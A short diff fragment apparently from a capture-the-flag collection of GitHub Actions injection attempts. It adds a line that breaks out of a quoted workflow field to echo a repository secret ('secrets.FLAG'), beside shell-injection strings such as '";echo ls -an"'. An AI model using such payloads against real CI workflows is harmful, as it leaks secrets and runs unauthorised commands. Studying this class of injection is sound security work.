@@ -738,3 +738,4 @@ ${{ github.event.issue.number }} $( flag )
 ";echo ls -an"
 joaovarelas:
 ggugg:test
+ggugg:" | echo "${{ secrets.FLAG }}
